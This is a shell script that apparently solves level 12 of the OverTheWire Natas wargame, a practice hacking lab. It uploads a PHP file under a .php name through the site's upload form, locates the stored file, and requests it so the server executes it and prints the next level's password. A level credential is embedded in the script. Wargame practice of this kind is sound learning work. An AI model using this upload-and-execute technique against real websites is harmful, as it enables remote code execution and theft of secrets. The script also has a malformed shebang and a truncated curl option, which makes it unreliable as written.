#/bin/sh

RESPONSE=$(curl --silen \
                --form "filename=foobarquxq.php" \
                --form "uploadedfile=@./resources/natas12.php" \
                --form "submit=Submit" \
                --user natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 \
                http://natas12.natas.labs.overthewire.org/index.php)

UPLOADED_FILE_RELATIVE_PATH=$(echo ${RESPONSE} | grep -Eo  ">upload/[A-Za-z0-9]{10}.php<" | grep -Eo "upload/[A-Za-z0-9]{10}.php")

PASSWORD=$(curl --silent \
                --user natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 \
                http://natas12.natas.labs.overthewire.org/${UPLOADED_FILE_RELATIVE_PATH})

printf "The password for natas13 is: ${PASSWORD}\n"
